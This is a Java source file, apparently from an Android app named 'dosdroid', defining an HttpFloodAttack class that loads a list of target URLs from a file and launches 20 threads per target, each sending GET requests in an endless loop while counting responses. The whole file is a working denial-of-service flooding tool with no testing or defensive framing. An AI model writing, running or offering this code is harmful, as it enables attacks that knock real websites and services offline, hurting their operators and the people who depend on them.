package com.nemesis.dosdroid;

import android.net.Uri;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class HttpFloodAttack {
    private static final String TAG = "HttpFloodAttack";
    public static List<String> targetUrls = new ArrayList<>();
    public static int NUM_THREADS = 20; // Number of concurrent threads
    private static MainActivity mainActivity;

    private static int successfulRequests = 0; // Counter for successful requests
    private static int failedRequests = 0;     // Counter for failed requests

    // Getter for NUM_THREADS
    public static int getNumThreads() {
        return NUM_THREADS;
    }

    // Initialize with MainActivity to call UI updates
    public static void initialize(MainActivity activity) {
        mainActivity = activity;
    }

    // Synchronized methods to update counters
    public static synchronized void incrementSuccess() {
        successfulRequests++;
    }

    public static synchronized void incrementFailure() {
        failedRequests++;
    }

    public static synchronized int getSuccessfulRequests() {
        return successfulRequests;
    }

    public static synchronized int getFailedRequests() {
        return failedRequests;
    }

    // Import URLs from a file
    public static void importUrlsFromFile(String filePath) {
        targetUrls.clear(); // Clear existing URLs to avoid duplicates
        try {
            // Use MainActivity's context to open the file
            BufferedReader reader = new BufferedReader(new InputStreamReader(MainActivity.getContext().getContentResolver().openInputStream(Uri.parse(filePath))));
            String line;
            while ((line = reader.readLine()) != null) {
                String trimmedLine = line.trim();
                if (!trimmedLine.isEmpty()) { // Avoid adding empty lines
                    targetUrls.add(trimmedLine); // Add URL to the target list
                    mainActivity.updateLog("Imported URL: " + trimmedLine); // Log imported URL
                }
            }
            reader.close();
        } catch (IOException e) {
            mainActivity.updateLog("Error importing URLs from file: " + e.getMessage());
        }
    }

    // Start the attack by launching multiple threads
    public static void startAttack() {
        ExecutorService executor = Executors.newFixedThreadPool(NUM_THREADS);
        for (String url : targetUrls) { // Loop through each target URL
            for (int i = 0; i < NUM_THREADS; i++) {
                executor.execute(new HttpRequestTask(url)); // Pass URL to the task
            }
        }
        executor.shutdown();
    }

    // Runnable class for sending HTTP/HTTPS requests
    public static class HttpRequestTask implements Runnable {
        private final String url; // Store the URL for each task

        // Constructor to initialize the URL
        public HttpRequestTask(String url) {
            this.url = url;
        }

        @Override
        public void run() {
            int requestCount = 0; // Track the number of requests
            while (true) { // Infinite loop
                try {
                    URL targetUrl = new URL(url);  // Java's URL class handles both HTTP and HTTPS
                    HttpURLConnection connection = (HttpURLConnection) targetUrl.openConnection();
                    connection.setRequestMethod("GET");
                    connection.connect();

                    int responseCode = connection.getResponseCode();
                    String logMessage = "Request " + requestCount + " to " + targetUrl + " completed with response code " + responseCode;
                    requestCount++;

                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        incrementSuccess(); // Successful request
                    } else {
                        incrementFailure(); // Failed request (non-200 response)
                    }

                    // Update the TextView in MainActivity with the log message
                    mainActivity.updateLog(logMessage);

                } catch (IOException e) {
                    incrementFailure(); // Failed request due to exception
                    String errorMessage = "Error sending request to " + url + ": " + e.getMessage();
                    mainActivity.updateLog(errorMessage);
                }

                // Check if the service has been stopped (optional)
                if (Thread.currentThread().isInterrupted()) {
                    break; // Exit the loop if the thread is interrupted (stopping manually)
                }
            }
        }
    }
}
